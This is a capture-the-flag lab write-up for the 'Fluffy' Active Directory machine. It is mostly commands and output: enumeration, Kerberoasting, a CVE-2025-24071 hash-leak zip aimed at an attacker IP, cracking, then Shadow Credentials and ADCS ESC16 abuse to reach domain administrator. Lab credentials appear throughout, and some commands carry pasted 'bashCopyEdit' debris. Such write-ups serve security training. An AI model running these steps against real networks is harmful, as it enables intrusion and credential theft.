---
hidden: true
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Fluffy

## Foothold

### Domain Recon

To understand the attack surface, we run a TCP port scan. The scan reveals several key services typical of an Active Directory Domain Controller, including Kerberos, LDAP, and SMB:

```bash
# TCP port scan
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP 
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP 
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

# OS fingerprinting guess
Microsoft Windows Server 2019 or Windows 10 (97% confidence)
```

This confirms we are dealing with a Windows AD environment, setting the stage for user enumeration and credential-based attacks. Using the `nxc` tool, we first enumerate all domain users. This gives us a list of potential targets for later password spraying and privilege escalation attempts:

{% code overflow="wrap" %}
```bash
# Extract domain users for future use
$ nxc smb fluffy -u j.fleischman -p J0elTHEM4n1990! --users | \
  awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" && $5 != "Guest" && $5 != "krbtgt" {print $5}' > domain_users
```
{% endcode %}

Next, we list SMB shares accessible to `j.fleischman`. Aside from the default shares (`ADMIN$`, `C$`, `IPC$`), there is a non-default share named `IT` which has `READ`/`WRITE` permissions. This is interesting because writable shares can contain sensitive files or serve as a pivot for attacks:

```bash
# List SMB shares
$ nxc smb fluffy -u j.fleischman -p J0elTHEM4n1990! --shares
...
SMB  10.10.11.69  445 DC01   IT        READ,WRITE
```

We recursively download all files from the `IT` share, ignoring standard admin shares, to inspect for any useful information or credentials:

```bash
# Download contents of IT share
$ nxc smb fluffy -u j.fleischman -p J0elTHEM4n1990! -M spider_plus \
  -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=420000 OUTPUT_FOLDER=./ \
  EXCLUDE_FILTER=admin$,print$,ipc$,netlogon,sysvol
```

Within the downloaded files, we find a folder containing KeePass files (`KeePass-2.58`) and an interesting PDF document named `Upgrade_Notice.pdf`. We convert it to text and read it:

```bash
$ pdftotext Upgrade_Notice.pdf
```

This document reveals known vulnerabilities relevant to the environment, potentially giving clues on attack vectors:

<figure><img src="../../.gitbook/assets/fluffy_cves.png" alt=""><figcaption></figcaption></figure>

We note down that there is [PoC](https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom) for CVE-2025-24071, but don't dive into it yet. We first want to finish our usual AD enumeration steps, such as testing for [AS-REPRoasting](../../tl-dr/active-directory/attacks/as-reproasting.md) and [Kerberoasting](../../tl-dr/active-directory/attacks/kerberoasting.md). Initially, our Kerberoasting attempt fails with a clock skew error:

{% code overflow="wrap" %}
```bash
$ impacket-GetUserSPNs -request -dc-ip dc01.fluffy.htb fluffy.htb/j.fleischman
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
{% endcode %}

This occurs because the attacker’s system clock is not synchronized with the DC’s clock, which is critical for Kerberos authentication. To fix this, we sync our system clock:

```bash
$ sudo ntpdate dc01
```

Now retrying Kerberoasting, we successfully retrieve hashes of several service accounts:

{% code overflow="wrap" %}
```bash
$ impacket-GetUserSPNs -request -dc-ip dc01.fluffy.htb fluffy.htb/j.fleischman
...
ADCS/ca.fluffy.htb      ca_svc     
LDAP/ldap.fluffy.htb    ldap_svc   
WINRM/winrm.fluffy.htb  winrm_svc  
```
{% endcode %}

Unfortunately, none of these hashes can be cracked:

{% code overflow="wrap" %}
```bash
$ hashcat -m13100 svc_hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}

### CVE-2025-24071

Since we have no other way in, we go back to the CVE-2025-24071 [PoC](https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom). First, we start Responder to capture hashes:

```bash
$ sudo responder -I tun0
...
[+] Current Session Variables:
    Responder Machine Name     [WIN-I4J8LPW1O3B] # The name of the share
    Responder Domain Name      [NO0W.LOCAL]
    Responder DCE-RPC Port     [46796]
```

Then, we generate a malicious `.zip` file with `msfconsole` that exploits the vulnerable Windows component to leak NTLM hashes:

{% code overflow="wrap" %}
```bash
$ sudo msfconsole -q -x "use auxiliary/server/ntlm_hash_leak; set ATTACKER_IP 10.10.15.15; set FILENAME exploit.zip; set LIBRARY_NAME malicious.library-ms; set SHARE_NAME WIN-I4J8LPW1O3B; run; exit;"
```
{% endcode %}

We upload the malicious ZIP to the writable share:

{% code overflow="wrap" %}
```bash
$ nxc smb dc01 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --share IT --put-file exploit.zip exploit.zip
```
{% endcode %}

Once the victim interacts with this file, their NTLMv2 hash is captured by Responder:

{% code overflow="wrap" %}
```bash
$ sudo responder -I tun0
...
05/28/2025 09:31:44 PM - [SMB] NTLMv2-SSP Client   : 10.10.11.69
05/28/2025 09:31:44 PM - [SMB] NTLMv2-SSP Username : FLUFFY\p.agila
05/28/2025 09:31:44 PM - [SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:c34...000
```
{% endcode %}

We then attempt to crack this hash offline:

{% code overflow="wrap" %}
```bash
$ hashcat -m5600 p.agila_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
P.AGILA::FLUFFY:c34...000:prometheusx-303
```
{% endcode %}

To map domain relationships and potential privilege escalation paths, we collect comprehensive domain data using BloodHound enumeration:

{% code overflow="wrap" %}
```bash
# Collect domain data
$ nxc ldap 10.10.11.69 -u p.agila -p prometheusx-303 --bloodhound -c All --dns-server 10.10.11.69
```
{% endcode %}

## Privilege Escalation

Analyzing the domain data with BloodHound gives us a potential PE vector:

<figure><img src="../../.gitbook/assets/bh_fluffy_ca.png" alt=""><figcaption></figcaption></figure>

{% stepper %}
{% step %}
`p.agila` → `Service Account Managers` member

`Service Account Managers` → `GenericAll` over `Service Accounts`&#x20;

{% hint style="success" %}
`p.agila` can add itself to `Service Accounts`
{% endhint %}
{% endstep %}

{% step %}
`Service Accounts` → `GenericWrite` over `ca_svc`

{% hint style="success" %}
Member of this group, in this case `p.agila`, can modify `ca_svc`'s attributes, including the `msDS-KeyCredentialLink` attribute ([Shadow Credentials](../../tl-dr/active-directory/attacks/adcs.md#shadow-credentials) attack)
{% endhint %}
{% endstep %}

{% step %}
`ca_svc` → [`Cert Publishers`](../../tl-dr/active-directory/groups/cert-publishers.md) member

{% hint style="success" %}
`Cert Publishers` memberships can often lead to [ESC attacks](../../tl-dr/active-directory/attacks/adcs.md#esc-attacks)
{% endhint %}
{% endstep %}
{% endstepper %}

{% code overflow="wrap" %}
```bash
# Add p.agila to the Service Accounts group
net rpc group addmem "Service Accounts" "p.agila" -U fluffy.htb/p.agila%prometheusx-303 -S dc01
```
{% endcode %}

_Explanation:_\
Using `net rpc group addmem`, we modify Active Directory group memberships remotely to add our user to the privileged group. The `-U` flag supplies the username and password, and `-S` specifies the DC.

***

#### Step 2: Launch the Shadow Credentials attack with Certipy

Shadow Credentials allow us to add a certificate-based authentication key to the `ca_svc` account. This certificate can then be used to authenticate as that user without knowing the password.

```bash
bashCopyEdituv run certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -account 'ca_svc'
```

_What happens here:_

* Certipy generates a rogue certificate and private key.
* It injects the public key into `ca_svc`'s **KeyCredentialLink** attribute in AD.
* This enables certificate-based auth for `ca_svc` without its password.
* Certipy authenticates using this certificate and fetches a TGT (Ticket Granting Ticket).
* It attempts to retrieve the NT hash of `ca_svc` from memory and restores the original state to avoid detection.

***

#### Step 3: Check for vulnerable certificate templates

Not all AD CS setups allow abuse like this. Certipy checks for vulnerable certificate templates (like `ESC16`) that enable this attack.

```bash
bashCopyEdituv run certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -stdout -vuln
```

_The output shows:_\
`ESC16: Security Extension is disabled.`

This means the CA allows certificate enrollment with less security, enabling the attack.

***

#### Step 4: Backup the original `userPrincipalName` (UPN) of `ca_svc`

Before modifying the victim account, we read and save the current UPN to restore it later:

```bash
bashCopyEdituv run certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -user 'ca_svc' read
```

This retrieves all key attributes including `userPrincipalName: ca_svc@fluffy.htb`.

***

#### Step 5: Modify the victim account’s UPN to `administrator`

To escalate privileges further, we update the victim's UPN to match the target privileged user (`administrator`).

```bash
bashCopyEdituv run certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
```

_Why?_\
When requesting a certificate from the CA, the certificate will embed the UPN as an identity claim. Setting it to `administrator` lets us request a cert that impersonates the admin.

***

#### Step 6: Request a client authentication certificate for `administrator`

Using the vulnerable CA template, we request a certificate for the `administrator` identity on the DC.

```bash
bashCopyEdituv run certipy req -k -dc-ip 10.10.11.69 -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
```

_Details:_

* The CA issues a certificate with UPN `administrator`.
* This certificate can be used to authenticate as the administrator without the password.

***

#### Step 7: Revert the UPN of `ca_svc` to the original value

To avoid detection and preserve stability, we restore the victim account's UPN.

```bash
bashCopyEdituv run certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -upn 'cva_svc@fluffy.htb' -user 'ca_svc' update
```

***

#### Step 8: Authenticate as `administrator` using the certificate

Finally, we authenticate to the domain controller with the certificate and obtain a valid Kerberos TGT for the administrator account:

```bash
bashCopyEdituv run certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb'
```

_Outcome:_

* Certipy uses the certificate to request a Kerberos ticket.
* We gain full administrator access on the domain.

***

### Summary of Privilege Escalation Flow

1. **BloodHound analysis** revealed that `p.agila` can manipulate privileged groups and accounts.
2. Using `net rpc group addmem`, `p.agila` adds itself to the **Service Accounts** group.
3. With **GenericWrite** rights on `ca_svc`, we perform a **Shadow Credentials** attack via Certipy, injecting a rogue certificate into `ca_svc`.
4. We exploit a vulnerable CA template (`ESC16`) to request a certificate for the `administrator` identity by temporarily changing `ca_svc`’s UPN.
5. The certificate allows us to authenticate as `administrator` without its password, giving full domain admin privileges.
